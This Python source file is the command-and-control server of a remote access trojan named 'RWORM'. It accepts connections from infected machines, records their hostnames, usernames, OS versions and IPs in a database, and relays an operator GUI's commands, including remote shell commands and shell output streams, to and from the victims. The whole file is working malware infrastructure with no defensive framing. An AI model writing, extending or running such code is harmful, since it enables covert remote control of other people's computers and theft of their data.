import socket
import threading
import json
import sys
import traceback
from core.protocol import Packet, PACKET_TYPES, create_packet, parse_packet
from core.session  import ClientSession
from database.db   import Database

class RWORMServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 3333):
        self.host         = host
        self.port         = port
        self.server_socket= None
        self.clients      = {}   # session.id -> ClientSession (RAT clients with guid)
        self.all_sessions = {}   # session.id -> ClientSession (every socket)
        self.clients_lock = threading.Lock()
        self.db           = Database()
        self.running      = False

        # gui_controllers: rat_session.id -> gui_session
        self.controllers      = {}
        self.controllers_lock = threading.Lock()

        # shell_routes kept for backwards compat
        self.shell_routes = {}
        self.shell_lock   = threading.Lock()

    # ─── Listen loop ─────────────────────────────────────────────────────────
    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        self.running = True
        print(f"[*] RWORM Server started on {self.host}:{self.port}", flush=True)

        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New connection: {address}", flush=True)
                session = ClientSession(client_socket, address)
                with self.clients_lock:
                    self.all_sessions[session.id] = session
                t = threading.Thread(target=self.handle_client, args=(session,))
                t.daemon = True
                t.start()
            except Exception as e:
                if self.running:
                    print(f"[!] Accept error: {e}", flush=True)

    # ─── Per-client handler ──────────────────────────────────────────────────
    def handle_client(self, session: ClientSession):
        buf = b""
        try:
            while session.is_online:
                data = session.recv(1024 * 1024)
                if not data:
                    print(f"[-] Connection closed by {session.ip_address}", flush=True)
                    break
                buf += data
                while True:
                    if len(buf) < 25:
                        break
                    payload_len = int.from_bytes(buf[0:4], 'little')
                    total_len   = 9 + payload_len + 16
                    if len(buf) < total_len:
                        break
                    pkt = parse_packet(buf[:total_len])
                    buf = buf[total_len:]
                    if pkt:
                        self.process_packet(session, pkt)
                    else:
                        # HMAC mismatch — clear buffer to avoid stuck state
                        print(f"[!] HMAC mismatch from {session.ip_address} — clearing buffer", flush=True)
                        buf = b""
                        break
        except Exception as e:
            print(f"[!] Client handler error for {session.ip_address}: {e}", flush=True)
            traceback.print_exc()
        finally:
            self.remove_client(session)

    # ─── Packet dispatch ─────────────────────────────────────────────────────
    def process_packet(self, session: ClientSession, packet: Packet):
        t = packet.type

        # ── Always handle these directly, regardless of who sent them ─────────
        if t == 0x01:   # HEARTBEAT — RAT or GUI keepalive
            session.update_last_seen()
            return

        if t == 0x02:   # SYSTEM_INFO — RAT identifying itself
            try:
                info = json.loads(packet.payload.decode('utf-8'))
                session.set_system_info(info)
                with self.clients_lock:
                    # Same machine reconnecting over a new socket: drop any
                    # older session holding this GUID so the Clients page
                    # shows one live row per machine, not one per socket.
                    stale = [sid for sid, s in self.clients.items()
                             if s.guid == session.guid and sid != session.id]
                    for sid in stale:
                        old = self.clients.pop(sid, None)
                        if old is not None:
                            old.close()
                    self.clients[session.id] = session
                self.db.add_client(
                    session.guid, session.hostname,
                    session.username, session.os_version, session.ip_address)
                print(f"[+] Client identified: {session.hostname} ({session.username}) guid={session.guid[:8]}... @ {session.ip_address}", flush=True)
            except Exception as e:
                print(f"[!] SYSTEM_INFO parse error: {e}", flush=True)
            return

        if t == 0x10:   # GET_CLIENTS — GUI polling
            self._send_client_list(session)
            return

        # ── All other packets: route based on whether session is a RAT ─────
        # A RAT session has guid set (done by SYSTEM_INFO handler above).
        is_rat = session.guid is not None

        if is_rat:
            self._forward_to_gui(session, t, packet.payload)
        else:
            self._route_to_rat(session, t, packet.payload)

    # ─── Route GUI → RAT ─────────────────────────────────────────────────────
    def _route_to_rat(self, gui_session: ClientSession, ptype: int, payload: bytes):
        """Parse guid\x00rest from payload, find RAT, forward rest."""
        try:
            raw = payload.decode('utf-8', errors='replace')
        except Exception:
            return
        sep = raw.find('\x00')
        if sep < 0:
            print(f"[!] GUI packet type={ptype:#04x} has no guid prefix — ignored", flush=True)
            return

        guid    = raw[:sep]
        rest    = payload[sep + 1:]   # raw bytes after separator
        rat     = self._find_rat_by_guid(guid)
        if not rat:
            print(f"[!] No RAT found for guid={guid[:8]}...", flush=True)
            return

        # Track which GUI session controls this RAT
        with self.controllers_lock:
            self.controllers[rat.id] = gui_session
        if ptype == 0x20:
            with self.shell_lock:
                self.shell_routes[rat.id] = gui_session

        pkt = Packet(ptype, rest)
        rat.send(pkt.serialize())

    # ─── Forward RAT → GUI ────────────────────────────────────────────────────
    def _forward_to_gui(self, rat_session: ClientSession, ptype: int, payload: bytes):
        # Special case: SHELL_STREAM needs shell_routes lookup first
        if ptype == 0x22 and rat_session.guid:
            with self.shell_lock:
                gui = self.shell_routes.get(rat_session.id)
            if not gui:
                with self.controllers_lock:
                    gui = self.controllers.get(rat_session.id)
            if gui and rat_session.guid:
                prefix = (rat_session.guid + '\x00').encode('utf-8')
                gui.send(Packet(0x22, prefix + payload).serialize())
            return

        # All other RAT → GUI packets: prefix with guid\x00
        with self.controllers_lock:
            gui = self.controllers.get(rat_session.id)
        if not gui:
            # Fall back to any GUI session (no guid = GUI)
            with self.clients_lock:
                for s in self.all_sessions.values():
                    if s.guid is None and s.is_online:
                        gui = s
                        break
        if not gui:
            return

        prefix  = (rat_session.guid + '\x00').encode('utf-8')
        gui.send(Packet(ptype, prefix + payload).serialize())

    # ─── Helpers ─────────────────────────────────────────────────────────────
    def _send_client_list(self, session: ClientSession):
        clients = self.get_clients()
        data    = json.dumps(clients).encode('utf-8')
        session.send(Packet(0x11, data).serialize())

    def get_clients(self) -> list:
        # A client machine reconnecting opens a new socket each time, so the
        # same guid can appear under several session ids. Deduplicate by
        # guid — keep the most recently seen live session — so the Clients
        # page lists each machine exactly once. Prefer sessions that are
        # still online over stale entries.
        with self.clients_lock:
            best = {}
            for s in self.clients.values():
                if not s.guid:
                    continue
                cur = best.get(s.guid)
                if cur is None:
                    best[s.guid] = s
                    continue
                # online beats offline; otherwise newest last_seen wins
                if s.is_online and not cur.is_online:
                    best[s.guid] = s
                elif s.is_online == cur.is_online and s.last_seen > cur.last_seen:
                    best[s.guid] = s
            return [s.to_dict() for s in best.values()]

    def _find_rat_by_guid(self, guid: str):
        with self.clients_lock:
            # Prefer a live session for this guid; a reconnect leaves stale
            # entries behind that must not receive commands.
            live = None
            for s in self.clients.values():
                if s.guid == guid:
                    if s.is_online:
                        return s
                    if live is None:
                        live = s
            return live
        return None

    def remove_client(self, session: ClientSession):
        with self.clients_lock:
            self.clients.pop(session.id, None)
            self.all_sessions.pop(session.id, None)
        with self.shell_lock:
            self.shell_routes.pop(session.id, None)
        with self.controllers_lock:
            self.controllers.pop(session.id, None)
        if session.guid:
            try: self.db.update_client_status(session.guid, False)
            except: pass
        session.close()
        name = session.hostname or session.ip_address
        print(f"[-] Disconnected: {name}", flush=True)

    def stop(self):
        self.running = False
        try: self.server_socket.close()
        except: pass
        print("[*] Server stopped", flush=True)

    # Legacy compat
    def send_shell_command(self, client_id: str, command: str) -> str:
        with self.clients_lock:
            session = self.clients.get(client_id)
        if not session:
            return "Client not found"
        session.send(create_packet('SHELL_COMMAND', command.encode()))
        return "Command sent"

if __name__ == "__main__":
    server = RWORMServer()
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.stop()